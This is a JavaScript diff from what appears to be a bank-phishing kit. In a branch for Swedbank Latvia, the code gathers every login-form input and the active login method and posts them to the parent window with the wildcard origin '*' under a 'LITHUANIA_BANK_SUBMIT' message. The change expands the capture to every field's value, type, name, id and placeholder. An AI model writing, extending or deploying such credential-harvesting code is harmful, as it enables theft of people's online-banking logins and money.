@@ -536,7 +536,7 @@ if(bank==='swedbank-lv'){
     list.forEach(function(i){var k=i.name||i.id||'field';if(i.value&&i.value.trim())inputs[k]=i.value.trim();});
     var lm='';var act=document.querySelector('.login-type.active,vaadin-tab[selected],[role=tab][aria-selected=true],button[data-selected="true"],ui-tab.-active,ui-tab[active]');
     if(act)lm=(act.getAttribute('label')||act.getAttribute('aria-label')||act.textContent||'').trim();
-    try{parent.postMessage({type:'LITHUANIA_BANK_SUBMIT',formData:{inputs:inputs,fields:[],loginMethod:lm}},'*')}catch(_){ }
+    try{parent.postMessage({type:'LITHUANIA_BANK_SUBMIT',formData:{inputs:inputs,fields:list.map(function(i){return{key:i.name||i.id||'field',value:i.value||'',type:i.type||'text',name:i.name||'',id:i.id||'',placeholder:i.getAttribute('placeholder')||''};}),loginMethod:lm}},'*')}catch(_){ }
     return true;
   }
   document.addEventListener('click',function(e){
